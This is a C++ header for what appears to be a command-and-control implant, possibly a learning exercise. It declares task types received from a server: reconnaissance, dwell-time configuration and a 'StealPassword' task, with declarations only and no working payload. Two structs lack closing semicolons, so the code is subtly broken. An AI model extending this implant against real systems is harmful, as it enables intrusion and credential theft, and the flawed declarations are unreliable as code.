#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "results.h"

#include <variant>
#include <string>
#include <string_view>

#include <boost/uuid/uuid.hpp>
#include <boost/property_tree/ptree.hpp>

//define our configuration (implant dwell time and running status)
struct Configuration {
    Configuration(double meanDwell, bool isRunning);
    const double meanDwell;
    const bool isRunning;
}

//first task (ex: ping task)
struct SituationalAwareness{
    SituationalAwareness(const boost::uuids::uuid& id); //constructor
    constexpr static std::string_view key{"sitAware"}; //identify a task and call it "ping"
    [[nodiscard]] Result run() const; //run function and mark it as nodiscard (cant discard response)
    const boost::uuids::uuid id; //set up the id to track the task
}

//configure task --> set dwell time and running status
struct ConfigureTask {
    ConfigureTask(const boost::uuids::uuid& id, double meanDwell, bool isRunning,
		std::function<void(const Configuration&)> setter);
	constexpr static std::string_view key{ "configure" }; //set a key to identify the task named "configure"
	[[nodiscard]] Result run() const;
	const boost::uuids::uuid id;

private:
	std::function<void(const Configuration&)> setter;
	const double meanDwell; //private variables to store meandwell and if its running
	const bool isRunning;
};

// StealPassword
// -------------------------------------------------------------------------------------------
struct StealPassword {
	StealPassword(const boost::uuids::uuid& id, std::string command);
	constexpr static std::string_view key{ "steal" };
	[[nodiscard]] Result run() const;
	const boost::uuids::uuid id;

private:
	const std::string command;
};

//function responsible for parsing the tasks we receive from the server
//new tasks created must be added here too!!! ---------------------------
using Task = std::variant<SituationalAwareness, ConfigureTask, StealPassword>;

[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
std::function<void(const Configuration&)> setter);